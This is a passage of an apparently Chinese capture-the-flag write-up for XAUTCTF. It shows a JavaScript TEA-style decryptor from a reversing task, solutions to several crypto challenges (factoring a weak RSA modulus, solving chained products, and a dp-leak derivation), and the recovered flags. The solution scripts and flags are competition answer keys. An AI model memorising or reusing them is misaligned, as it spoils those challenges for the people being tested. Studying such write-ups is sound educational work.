class="number">0</span>]) ^ (v[j + <span class="number">1</span>] - sum) ^ ((v[j + <span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]))) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum = (sum - delta) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">uint32ArrayToString</span>(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	完整代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Encrypt</span>(<span class="params">plaintext, key</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> k = <span class="title function_">keyToUint32Array</span>(key);</span><br><span class="line">    <span class="keyword">let</span> v = <span class="title function_">stringToUint32Array</span>(plaintext);</span><br><span class="line">    <span class="keyword">let</span> n = v.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum = (sum + delta) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j += <span class="number">2</span>) &#123;</span><br><span class="line">            v[j] = (v[j] + (((v[j + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v[j + <span class="number">1</span>] - sum) ^ ((v[j + <span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]))) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">            v[j + <span class="number">1</span>] = (v[j + <span class="number">1</span>] + (((v[j] &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v[j] - sum) ^ ((v[j] &gt;&gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]))) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">uint32ArrayToBase64</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Dncrypt</span>(<span class="params">ciphertext, key</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> k = <span class="title function_">keyToUint32Array</span>(key);</span><br><span class="line">    <span class="keyword">let</span> v = <span class="title function_">base64ToUint32Array</span>(ciphertext);</span><br><span class="line">    <span class="keyword">let</span> n = v.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">let</span> sum = (delta * <span class="number">32</span>) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = n - <span class="number">2</span>; j &gt;= <span class="number">0</span>; j -= <span class="number">2</span>) &#123;</span><br><span class="line">            v[j + <span class="number">1</span>] = (v[j + <span class="number">1</span>] - (((v[j] &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v[j] - sum) ^ ((v[j] &gt;&gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]))) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">            v[j] = (v[j] - (((v[j + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v[j + <span class="number">1</span>] - sum) ^ ((v[j + <span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]))) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum = (sum - delta) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">uint32ArrayToString</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToUint32Array</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(((str.<span class="property">length</span> + <span class="number">3</span>) &amp; ~<span class="number">3</span>) * <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(buffer);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        view[i] = str.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> u32Array = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(u32Array);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">uint32ArrayToString</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(arr.<span class="property">length</span> * <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> u32View = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line">    u32View.<span class="title function_">set</span>(arr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(...<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(buffer)).<span class="title function_">replace</span>(<span class="regexp">/\0+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">keyToUint32Array</span>(<span class="params">key</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> paddedKey = key.<span class="title function_">padEnd</span>(<span class="number">16</span>, <span class="string">&#x27;\0&#x27;</span>).<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">stringToUint32Array</span>(paddedKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">uint32ArrayToBase64</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(arr.<span class="property">length</span> * <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> u32View = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line">    u32View.<span class="title function_">set</span>(arr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(...<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(buffer)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">base64ToUint32Array</span>(<span class="params">base64</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> binaryString = <span class="title function_">atob</span>(base64);</span><br><span class="line">    <span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(binaryString.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(buffer);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; binaryString.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        view[i] = binaryString.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> u32Array = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(u32Array);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> key = <span class="string">&quot;XAUTCTF6666666BR&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> plaintext = <span class="string">&quot;AOEQT5wdHKvDcQPkkUsaFA1xoJNrmjDM9iJGGTrrALQaR5TSym9cVN4CMWfviErzxzqJUDCzUhfHOolQMLNSF8c6iVAws1IXxzqJUDCzUhfHOolQMLNSF8c6iVAws1IXxzqJUDCzUhfHOolQMLNSF8c6iVAws1IXxzqJUDCzUhfHOolQMLNSF8c6iVAws1IXxzqJUDCzUhfHOolQMLNSF8c6iVAws1IXxzqJUDCzUhc=&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> decrypted = <span class="title class_">Dncrypt</span>(plaintext, key);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;解密结果:&quot;</span>, decrypted);</span><br><span class="line"><span class="comment">// 解密结果: XAUTCTF&#123;j4vASc2IPt_47so_11xE5_t0_d21nK_t34&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="private-key"><a href="#private-key" class="headerlink" title="private key"></a>private key</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>BR</br><br><b style="color:cyan;">	难度: </b>普通</br></p>
<p>​	众所周知，公钥加密，私钥解密，那么没有私钥，这怎么解？</p>
<p><strong>题解</strong></p>
<p>​	题目给到代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">flag</span>):</span><br><span class="line">    rsakey = RSA.importKey(<span class="built_in">open</span>(<span class="string">&#x27;public_key.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read())</span><br><span class="line">    rsakey = PKCS1_OAEP.new(rsakey)</span><br><span class="line">    c = rsakey.encrypt(flag)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(c)</span><br></pre></td></tr></table></figure>

<p>​	一个朴实无华的加密过程</p>
<p>​	其中flag.enc就是被public_key.pem公钥加密的flag</p>
<p>​	这时我们想到用私钥来解密，但是题目没有给到私钥，因此需要我们自己来生成一个私钥</p>
<p>​	私钥的生成需要n, e, d, p, q</p>
<p>​	通过对公钥进行提取我们可以获得n和e，p和q则需要通过分解n来获得，d又可以由p与q计算得到</p>
<p>​	完整解密代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分析公钥获得n和e</span></span><br><span class="line">key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&#x27;public_key.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read())</span><br><span class="line">n = <span class="built_in">int</span>(key.n)</span><br><span class="line">e = <span class="built_in">int</span>(key.e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 在https://factordb.com/对n进行质数分解可得到p和q</span></span><br><span class="line">p = <span class="number">541</span></span><br><span class="line">q = <span class="number">5693324408981647776459067230365645473507146658322707679878165772211971926857402335974605611412434886675703030006155064020332300972661321569916884684211587</span></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 用n, e, d, p, q生成私钥解密flag.enc</span></span><br><span class="line">publickey = RSA.construct((n, e, d, p, q))</span><br><span class="line">rsa = PKCS1_OAEP.new(publickey)</span><br><span class="line">m = rsa.decrypt(<span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># XAUTCTF&#123;Y0v_c4n_4K_Rza&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="开心解方程"><a href="#开心解方程" class="headerlink" title="开心解方程"></a>开心解方程</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>BR</br><br><b style="color:cyan;">	难度: </b>签到</br></p>
<p>​	解方程谁不会啊！我靠，这么大的数！</p>
<p><strong>题解</strong></p>
<p>​	下载附件得到代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> real_flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_number</span>():</span><br><span class="line">    <span class="keyword">return</span> random.randint(<span class="number">10</span>**<span class="number">1000</span>,<span class="number">10</span>**<span class="number">1001</span>)</span><br><span class="line"></span><br><span class="line">a = bytes_to_long(real_flag)</span><br><span class="line">b = get_random_number()</span><br><span class="line">c = get_random_number()</span><br><span class="line">d = get_random_number()</span><br><span class="line"></span><br><span class="line">n1 = a*b</span><br><span class="line">n2 = b*c</span><br><span class="line">n3 = c*d</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1 = <span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2 = <span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n3 = <span class="subst">&#123;n3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n1 = 66045023993762767647242315275308876286649365291217503549902618148001055600837022713282069278294139902007828665299975891709141384342029428818368233779456718169837800519061495614455266698646033095374249294950476237868464929160829338247617019650720386071747841563053142875198078814651522327972628160281265970330976279743604849662791159837738526278277804680018800310344237561891670714267422167030239697292228352005490559316629402219654671826647258405005330060768620619801431339140844543743546141947826432699292853951849820803407732079211059907138637996805917396616886186331056392904534431539573143000039333074217827378203023213727182933822404231273878515223694690030696828022257662583963453718083703096060400947526828103727712197985948128656176265398780528680051014074367363757135311498467947501765974696818796857305793400931866930599659487334282645052632999648160834373981904533240911850451900220747740086671961000393504835019410391886465691868164395211894606769208890677518534623136224769033814232296694099251235641838645747668791623742241443998344435370538812516231728525148001841752921696848750</span></span><br><span class="line"><span class="string">n2 = 1320555599487714080996044771745109086409124950193806115910044002171639132721369936242832350793080200151731581915533389367530841711349085311654859210708745168348139761175994308379008233352944795195337029075338491705223417989574046182393904858738777565509853429460260485779945219957452432288882759456841973743350958897759005840184935356935516353677399298947271240304110942678580581733243590953541428260608718550254028964807862266521437217496044696887150481438415810735591397935910573863686620039825142973597345028031192292214474693621914446259072409767541707238135552166962594482265307944904262622356821924062115483845191792169134692726081339767300737406933509657057434734295214281830711402527265191878673192096981687978442654546866046508586476256515448447811724411143277304139097556106638517758052946777603373414718743201041457262387388159970341161602413204816234240553296477562124049501381372017556520920586470701549545089935276803924008842264302810625461265377705801836445624439120595410039147084242300905693410555017365335530737466743139039924035032068579167676172084945497968079618527330264059524279485179524483046111493426596846285692408550381435997945232073832763443550596008177794944202693534077109186288822812097105682483066250943025890835561307754202362984369467279547412073663826807534256586945293235617054258815517181939040026079969202048794243981043255339273692894150669176924938335078841860602598371066015697457441400163743192636313066256712591757257494154994280331839805559187408397250773686866802818270549433199589628543682696970616778551521253364165555410491946329838745400060156090812855739048860203804808159394507270828085983711687051132928366501718966622880415453783762907053842805719073490304849577857363840727974548747309667095286171395631455414832082074931682010365020038631272891592002564580710824126596067472012197426483126969375110424700166659703938297489007306732474884651764478730965436145663198752419446509365022660147218357448783598847793577903599742398436141520668329522500</span></span><br><span class="line"><span class="string">n3 = 2494102727139988031657548916400076008469745351322274139719108651479694185398883900731956896064609625535589283127438178479899342631002290223761281335086590271453325110263075086863802248422343374265520039092287051974670420810260395594587214259380987308495187276102405110037698364568798469022294178145782146014876496768949227234629547115761072490459208650215233576124537759149621005091452731826139522830627358953262413872737766190736148691591455392273493333744660685456016812260177567784789706568505579320655796589399021812071850427201359345113086254185842792188109694821873608861967542521034391955635188766346448358522095384182181919121572454416214847465348256361362566514678435298592845553522433282587659801172426416706609642034717339642211417654280894950890159462635828804440976899777025050168473102365715107684396600436067391006056594244266779919508243001527693875044625987231235831989933929204915500642424704317103808385950745874843327090287006673742178580193389137707512337808409919117485720406798799553125641011372640451089845896663282887165936957056289873133466762895411684476032902068990006887183350425663108368180802497459392657668788890982438237757541704285743361668534480198281931514155933889777470075218534626274198762865005970764338886601702657222928202827690787497964864232677329294105797820334409760600739305323843208626608999128155104856870670912614117531695398766898333476774303080010211697227780036928625795136409579400929053570378365274515982948413125504474009300341414250851316021652921246258261191470292461195698250713229612394303041313776569564799724769801197317501679865347012122228211555527056879353720812275916353888916615582761695952757154221134412075102823205932950308884150988373023805958090095880726162291314683535968376355629578629232070688294172962311300021342332871193989690221140421570486753526911612358742179375594473893822922907246112505646925845519726644426849366087858581334667012569682331014586041121918212242373332106875529757752615031856738830163693909495716952252</span></span><br><span class="line"><span class="string">d = 43364937265758956156273680911300489616898864746752052291350312162776515277587261760117478030997894848711863062332928599355367770340515527595727956406975492260815315498533833768722189153710484592913738532365673774052006949783671389279815139617850311090514642725422993266833831943072802672492932699094012215360254640960227975759052847451203242806549366072770629235099284854845437409705329699239996521945098027994835464446725904453652773044842784544412256242118283430388576377678521305677820630677657440308643210013580457568689468797843750521813033835004488235590736872749731499959534712906125337371416903474439687119856674163258250861941374676530169084879695020684481481410037773090335748058105789070805869999041901955824447836101464317191236662824486520610443251865074390805817717017127665798074743330797207555861776404708326789709130589836098908059835861036678714787524364757466440053920339450890171852169379258482211489419367529048929245318441840741348189118893773590728665799522362650234927535765626</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>​	<code>a*b=n1</code> <code>b*c=n2</code> <code>c*d=n3</code>，已知<code>n1</code> <code>n2</code> <code>n3</code> <code>d</code>，求<code>a</code>这不显而易见，但是数字比较大，手算不现实，用脚本来帮忙：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n1 = <span class="number">66045023993762767647242315275308876286649365291217503549902618148001055600837022713282069278294139902007828665299975891709141384342029428818368233779456718169837800519061495614455266698646033095374249294950476237868464929160829338247617019650720386071747841563053142875198078814651522327972628160281265970330976279743604849662791159837738526278277804680018800310344237561891670714267422167030239697292228352005490559316629402219654671826647258405005330060768620619801431339140844543743546141947826432699292853951849820803407732079211059907138637996805917396616886186331056392904534431539573143000039333074217827378203023213727182933822404231273878515223694690030696828022257662583963453718083703096060400947526828103727712197985948128656176265398780528680051014074367363757135311498467947501765974696818796857305793400931866930599659487334282645052632999648160834373981904533240911850451900220747740086671961000393504835019410391886465691868164395211894606769208890677518534623136224769033814232296694099251235641838645747668791623742241443998344435370538812516231728525148001841752921696848750</span></span><br><span class="line">n2 = <span class="number">1320555599487714080996044771745109086409124950193806115910044002171639132721369936242832350793080200151731581915533389367530841711349085311654859210708745168348139761175994308379008233352944795195337029075338491705223417989574046182393904858738777565509853429460260485779945219957452432288882759456841973743350958897759005840184935356935516353677399298947271240304110942678580581733243590953541428260608718550254028964807862266521437217496044696887150481438415810735591397935910573863686620039825142973597345028031192292214474693621914446259072409767541707238135552166962594482265307944904262622356821924062115483845191792169134692726081339767300737406933509657057434734295214281830711402527265191878673192096981687978442654546866046508586476256515448447811724411143277304139097556106638517758052946777603373414718743201041457262387388159970341161602413204816234240553296477562124049501381372017556520920586470701549545089935276803924008842264302810625461265377705801836445624439120595410039147084242300905693410555017365335530737466743139039924035032068579167676172084945497968079618527330264059524279485179524483046111493426596846285692408550381435997945232073832763443550596008177794944202693534077109186288822812097105682483066250943025890835561307754202362984369467279547412073663826807534256586945293235617054258815517181939040026079969202048794243981043255339273692894150669176924938335078841860602598371066015697457441400163743192636313066256712591757257494154994280331839805559187408397250773686866802818270549433199589628543682696970616778551521253364165555410491946329838745400060156090812855739048860203804808159394507270828085983711687051132928366501718966622880415453783762907053842805719073490304849577857363840727974548747309667095286171395631455414832082074931682010365020038631272891592002564580710824126596067472012197426483126969375110424700166659703938297489007306732474884651764478730965436145663198752419446509365022660147218357448783598847793577903599742398436141520668329522500</span></span><br><span class="line">n3 = <span class="number">2494102727139988031657548916400076008469745351322274139719108651479694185398883900731956896064609625535589283127438178479899342631002290223761281335086590271453325110263075086863802248422343374265520039092287051974670420810260395594587214259380987308495187276102405110037698364568798469022294178145782146014876496768949227234629547115761072490459208650215233576124537759149621005091452731826139522830627358953262413872737766190736148691591455392273493333744660685456016812260177567784789706568505579320655796589399021812071850427201359345113086254185842792188109694821873608861967542521034391955635188766346448358522095384182181919121572454416214847465348256361362566514678435298592845553522433282587659801172426416706609642034717339642211417654280894950890159462635828804440976899777025050168473102365715107684396600436067391006056594244266779919508243001527693875044625987231235831989933929204915500642424704317103808385950745874843327090287006673742178580193389137707512337808409919117485720406798799553125641011372640451089845896663282887165936957056289873133466762895411684476032902068990006887183350425663108368180802497459392657668788890982438237757541704285743361668534480198281931514155933889777470075218534626274198762865005970764338886601702657222928202827690787497964864232677329294105797820334409760600739305323843208626608999128155104856870670912614117531695398766898333476774303080010211697227780036928625795136409579400929053570378365274515982948413125504474009300341414250851316021652921246258261191470292461195698250713229612394303041313776569564799724769801197317501679865347012122228211555527056879353720812275916353888916615582761695952757154221134412075102823205932950308884150988373023805958090095880726162291314683535968376355629578629232070688294172962311300021342332871193989690221140421570486753526911612358742179375594473893822922907246112505646925845519726644426849366087858581334667012569682331014586041121918212242373332106875529757752615031856738830163693909495716952252</span></span><br><span class="line">d = <span class="number">43364937265758956156273680911300489616898864746752052291350312162776515277587261760117478030997894848711863062332928599355367770340515527595727956406975492260815315498533833768722189153710484592913738532365673774052006949783671389279815139617850311090514642725422993266833831943072802672492932699094012215360254640960227975759052847451203242806549366072770629235099284854845437409705329699239996521945098027994835464446725904453652773044842784544412256242118283430388576377678521305677820630677657440308643210013580457568689468797843750521813033835004488235590736872749731499959534712906125337371416903474439687119856674163258250861941374676530169084879695020684481481410037773090335748058105789070805869999041901955824447836101464317191236662824486520610443251865074390805817717017127665798074743330797207555861776404708326789709130589836098908059835861036678714787524364757466440053920339450890171852169379258482211489419367529048929245318441840741348189118893773590728665799522362650234927535765626</span></span><br><span class="line"></span><br><span class="line">c = n3//d</span><br><span class="line">b = n2//c</span><br><span class="line">a = n1//b</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(a)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;XAUTCTF&#123;S0Lv1N6_The_3QUA71ON_iS_51M91E&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>BR</br><br><b style="color:cyan;">	难度: </b>普通</br></p>
<p>​	这伞兵BR又出了什么抽象题？忍不了了！和BR爆了！！！</p>
<p><strong>题解</strong></p>
<p>​	dp泄露类的基础题目。</p>
<p>​	首先是要明白什么是<code>dp</code>和，这是在运算过程中方便计算的中间量，表示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp = d % (p-1)</span><br></pre></td></tr></table></figure>

<p>​	推导一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">d = dp + k1 * (p-1) </span><br><span class="line"></span><br><span class="line">d * e = 1 + k2*(p-1)*(q-1) </span><br><span class="line"></span><br><span class="line">把第二个式子的d代换掉：</span><br><span class="line"></span><br><span class="line">e * (dp + k1*(p-1)) = 1 + k2*(p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">两边同时对(p-1)取模，消去k</span><br><span class="line"></span><br><span class="line">e * dp % (p - 1) = 1</span><br><span class="line"></span><br><span class="line">e * dp = 1 + k*(p - 1)</span><br></pre></td></tr></table></figure>

<p>​	爆破出k即可解出p，进而求得d解出密文即可</p>
